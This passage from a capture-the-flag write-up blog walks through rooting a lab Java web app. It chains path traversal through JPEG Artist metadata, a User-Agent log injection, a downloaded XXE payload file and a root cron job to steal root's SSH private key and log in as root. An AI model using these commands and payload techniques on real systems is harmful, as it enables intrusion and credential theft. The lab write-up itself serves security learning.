+<li>Artist tag used in file paths without sanitization</li>
+</ul>
+<h4 id="vulnerable-xml-processing">Vulnerable XML Processing:</h4>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="public%20static%20void%20addViewTo%28String%20path,%20String%20uri%29%20throws%20JDOMException,%20IOException%20%7b%0a%20%20%20%20//%20VULNERABILITY:%20XXE%20possible%20-%20external%20entities%20enabled%0a%20%20%20%20SAXBuilder%20saxBuilder%20=%20new%20SAXBuilder%28%29;%0a%20%20%20%20//%20VULNERABILITY:%20Path%20traversal%20via%20artist%20name%0a%20%20%20%20String%20xmlPath%20=%20%22/credits/%22%20&#43;%20artist%20&#43;%20%22_creds.xml%22;%0a%20%20%20%20//%20...%20XML%20processing%20...%0a%7d">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">addViewTo</span>(String path, String uri) <span style="color:#66d9ef">throws</span> JDOMException, IOException {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// VULNERABILITY: XXE possible - external entities enabled</span>
+</span></span><span style="display:flex;"><span>    SAXBuilder saxBuilder <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> SAXBuilder();
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// VULNERABILITY: Path traversal via artist name</span>
+</span></span><span style="display:flex;"><span>    String xmlPath <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/credits/&#34;</span> <span style="color:#f92672">+</span> artist <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;_creds.xml&#34;</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// ... XML processing ...</span>
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>XML parser allows external entities (XXE)</li>
+<li>Direct path concatenation with artist name</li>
+<li>No path sanitization</li>
+</ul>
+<h4 id="why-these-vulnerabilities-matter">Why These Vulnerabilities Matter:</h4>
+<ol>
+<li>
+<p><strong>Path Traversal Chain</strong>:</p>
+<ul>
+<li>Attacker can craft JPEG with malicious artist metadata</li>
+<li>Example: <code>../tmp/bloodstiller</code> as artist name</li>
+<li>Results in path: <code>/credits/../tmp/bloodstiller_creds.xml</code></li>
+</ul>
+</li>
+<li>
+<p><strong>XXE Attack Chain</strong>:</p>
+<ul>
+<li>Create malicious XML in predicted location</li>
+<li>XML contains external entity references</li>
+<li>Processed as root due to cron job</li>
+<li>Can read sensitive files like <code>/root/.ssh/id_rsa</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Root Privilege Exploitation</strong>:</p>
+<ul>
+<li>Application runs as root via cron</li>
+<li>Processes untrusted input</li>
+<li>No security controls</li>
+<li>Predictable file paths</li>
+</ul>
+</li>
+<li>
+<p><strong>The vulnerabilities chain together because</strong>:</p>
+<ul>
+<li>We can control the artist metadata in JPEGs</li>
+<li>This metadata is used in file paths without sanitization</li>
+<li>The XML parser processes external entities</li>
+<li>Everything runs with root privileges</li>
+</ul>
+</li>
+</ol>
+<h3 id="xxe-primer-what-is-xml-external-entity-processing">XXE Primer: What is XML External Entity Processing?</h3>
+<ul>
+<li>
+<p>Portswigger have a great explanation <a href="https://portswigger.net/web-security/xxe#what-is-xml-external-entity-injection">here</a>.</p>
+</li>
+<li>
+<p><strong>Brief Overview</strong>:</p>
+<ul>
+<li>XXE attacks involve <strong>exploiting vulnerable XML processors by injecting malicious XML content</strong>.</li>
+<li>Attackers can leverage this to access sensitive data, execute remote requests, or cause denial of service.</li>
+</ul>
+</li>
+<li>
+<p><strong>Common XXE Attacks</strong>:</p>
+<ul>
+<li>Data Breach
+<ul>
+<li>Access to filesystem: Reading files, directory structures. (<strong>This is what we will do</strong>)</li>
+</ul>
+</li>
+<li>Remote Code Execution
+<ul>
+<li>In severe cases, lead to executing arbitrary code on the server.</li>
+</ul>
+</li>
+<li>Denial of Service (DoS)
+<ul>
+<li>Consuming server resources by referencing large or recursive entities.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="exploitation">Exploitation:</h3>
+<h4 id="overview-of-attack-chain">Overview of Attack Chain:</h4>
+<ol>
+<li>Create malicious JPEG with crafted Artist metadata</li>
+<li>Place malicious XML file in predictable location</li>
+<li>Trigger log processing via web request</li>
+<li>Wait for root cron job to process our malicious files</li>
+<li>Extract sensitive data via XXE</li>
+</ol>
+<h4 id="step-1-crafting-malicious-jpeg">Step 1: Crafting Malicious JPEG:</h4>
+<ul>
+<li>
+<p>Download sample image for modification:
+<img src="/ox-hugo/2025-01-11-103022_.png" alt=""></p>
+</li>
+<li>
+<p>Verify current metadata state:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="exiftool%20Cat.jpg">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>exiftool Cat.jpg</span></span></code></pre></div>
+    
+</div>
+<figure><img src="/ox-hugo/2025-01-11-103141_.png">
+    </figure>
+
+<ul>
+<li><code>exiftool -Artist [image][.jpg]</code></li>
+<li>No existing Artist tag found</li>
+</ul>
+</li>
+<li>
+<p>Inject path traversal payload into Artist metadata:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="exiftool%20-Artist=%27../tmp/bloodstiller%27%20Cat.jpg">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>exiftool -Artist<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;../tmp/bloodstiller&#39;</span> Cat.jpg</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>This creates path: <code>/credits/../tmp/bloodstiller_creds.xml</code></li>
+<li>Uses directory traversal to escape <code>/credits/</code> directory</li>
+</ul>
+</li>
+</ul>
+<h4 id="step-2-creating-malicious-xml">Step 2: Creating Malicious XML:</h4>
+<ol>
+<li>
+<p>Download the template from web application that we discovered earlier.</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span> wget http://$box:8080/export.xml</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p>Modify XML to include XXE payload:</p>
+<ul>
+<li>At the moment I am using a POC to read <code>/etc/passwd</code> I am doing this as this a world readable file by any user and will provide us proof that we can trigger RCE via XXE.</li>
+<li><figure><img src="/ox-hugo/2025-01-12-074649_.png">
+</figure>
+</li>
+<li>Defines external entity that reads <code>/etc/passwd</code></li>
+<li>Maintains original XML structure</li>
+<li>Adds payload in predictable location</li>
+</ul>
+</li>
+<li>
+<p>Place XML file in target location:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>wget http://10.10.14.29:9000/export.xml -O /tmp/bloodstiller_creds.xml</span></span></code></pre></div>
+    
+</div>
+</li>
+</ol>
+<h4 id="step-3-triggering-exploitation">Step 3: Triggering Exploitation:</h4>
+<ol>
+<li>
+<p>Trigger log entry creation via web request:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%20curl%20-A%20%22bloodstiller%7c%7c/../../../../../../../../../../tmp/Cat.jpg%22%20http://$box:8080/">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span> curl -A <span style="color:#e6db74">&#34;bloodstiller||/../../../../../../../../../../tmp/Cat.jpg&#34;</span> http://$box:8080/</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li>Uses User-Agent header to inject log entry</li>
+<li>Path traversal in URI points to our malicious JPEG</li>
+</ul>
+</li>
+<li>
+<p>Verify log entry creation:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="tail%20-f%20/opt/panda_search/redpanda.log">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>tail -f /opt/panda_search/redpanda.log</span></span></code></pre></div>
+    
+</div>
+<figure><img src="/ox-hugo/2025-01-11-112300_.png">
+    </figure>
+
+</li>
+<li>
+<p>Verify it worked:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="cat%20/tmp/bloodstiller_creds.xml">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat /tmp/bloodstiller_creds.xml</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-11-112351_.png">
+</figure>
+</li>
+<li>As we can see it now contains the contents of <code>/etc/passwd</code> verifying proof the POC works. Now to move onto exploitation.</li>
+</ul>
+</li>
+</ol>
+<h4 id="step-4-privilege-escalation-via-xxe">Step 4: Privilege Escalation via XXE:</h4>
+<ol>
+<li>
+<p>Modify XML to target SSH private key:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-12-074752_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>Wait for cron job execution (runs every 2 minutes)</p>
+</li>
+<li>
+<p>Extract private key from XML output:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%20cat%20/tmp/bloodstiller_creds.xml">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span> cat /tmp/bloodstiller_creds.xml</span></span></code></pre></div>
+    
+</div>
+<figure><img src="/ox-hugo/2025-01-11-112841_.png">
+    </figure>
+
+</li>
+<li>
+<p>Set proper permissions on extracted key:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%20chmod%20600%20id_rsa">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span> chmod <span style="color:#ae81ff">600</span> id_rsa</span></span></code></pre></div>
+    
+</div>
+</li>
+<li>
+<p>Login as root:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%20ssh%20-i%20id_rsa%20root@$box">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span> ssh -i id_rsa root@$box</span></span></code></pre></div>
+    
+</div>
+<figure><img src="/ox-hugo/2025-01-11-113209_.png">
+    </figure>
+
+</li>
+<li>
+<p>Retrieve root flag:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2025-01-11-113346_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ol>
+<h2 id="5-dot-persistence">5. Persistence:</h2>
+<ul>
+<li>I already have a root ssh key &amp; my brain is melted from the Java attack chain, so I am going to leave it at that.</li>
+</ul>
+<h2 id="lessons-learned">Lessons Learned:</h2>
+<h3 id="what-did-i-learn">What did I learn?</h3>
+<ol>
+<li>This was really hard for me. I know nothing about java and breaking down the code &amp; getting my head round it took a long time. Got there but this should not be an &ldquo;Easy&rdquo; box it&rsquo;s medium at the least.</li>
+<li>I learned so much about breaking down java and also chaining attacks.</li>
+</ol>
+<h3 id="what-silly-mistakes-did-i-make">What silly mistakes did I make?</h3>
+<ol>
+<li>Too numerous to list but was trying my best.</li>
+</ol>
+<h2 id="sign-off">Sign off:</h2>
+<p>Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!</p>
+<p>Until next time, hack the planet!</p>
+<p>– Bloodstiller</p>
+<p>– Get in touch bloodstiller at bloodstiller dot com</p>
+
+            
+        </div>
+    </article>
+
+        </main>
+
+        <footer class="footer">
+    <div class="footer-left">
+        <ul class="social">
+            
+                <li>All Rights Reserved ®.</li>
+            
+
+            
+                <li>Bloodstiller</li>
+            
+
+            
+                
+            
+                
+            
+                
+                    <li>
+                        
+                            <a href="https://github.com/bloodstiller" target="_blank">
+                                <i class="bi-github"></i>
+                            </a>
+                        
+
+                    </li>
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+        </ul>
+    </div>
+
+    <div class="footer-right">
+        <ul class="control status clearfix">
+            
+                <li>
+                    
+                        Word Count:
+                        4692
+                    
+                </li>
+            
+
+
+            
+                <li>en</li>
+            
+
+            
+
+            
+
+            
+                <li>
+                    
+                        Last modified: &nbsp;
+                        <time>
+                            Jan 12 2025 00:00:00
+                        </time>
+                    
+                </li>
+            
+
+            
+        </ul>
+    </div>
+</footer>
+
+    </body>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/codeblock_copy.c59588ba3a219dafab515508b0bcd2d0592dc9e0e08de20dc1983bfd8cb69d03d37c78eadd81ee7bef724570f9e4286d9ea1c53ca59d3711c0bcad9e9134d0e9.js"
+            integrity="sha512-xZWIujohna&#43;rUVUIsLzS0FktyeDgjeINwZg7/Yy2nQPTfHjq3YHue&#43;9yRXD55ChtnqHFPKWdNxHAvK2ekTTQ6Q=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/custom.e55ae031ca7d8c1e9bde9a72058dd382e3de5ff9b7df41d6d0e4ccb82ff9962e74b4865412dc15db16e5f16012d5cf9e2330b9826a3a36d5a272077f70e1341b.js"
+            integrity="sha512-5VrgMcp9jB6b3ppyBY3TguPeX/m330HW0OTMuC/5li50tIZUEtwV2xbl8WAS1c&#43;eIzC5gmo6NtWicgd/cOE0Gw=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/dir_toggle.e6f8c63f3ed9aefa9cedb3be3d5ab67e00bc3cf87a8dd7ef1ed55d642e9a7d80837636a26ae77f967f2aa74a44ae70c4134e25abca587f048c60807ba9e9c82f.js"
+            integrity="sha512-5vjGPz7Zrvqc7bO&#43;PVq2fgC8PPh6jdfvHtVdZC6afYCDdjaiaud/ln8qp0pErnDEE04lq8pYfwSMYIB7qenILw=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/sidebar.01b59c615736643387108a100de70c51d5e98477bdc338244a87d37f7e38286b48683459eade68087f0688f0235e7a48691e633954fa930d41823e9ddf797085.js"
+            integrity="sha512-AbWcYVc2ZDOHEIoQDecMUdXphHe9wzgkSofTf344KGtIaDRZ6t5oCH8GiPAjXnpIaR5jOVT6kw1Bgj6d33lwhQ=="></script>
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link
+    rel="stylesheet"
+    href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" />
+
+
+
+
+</html>
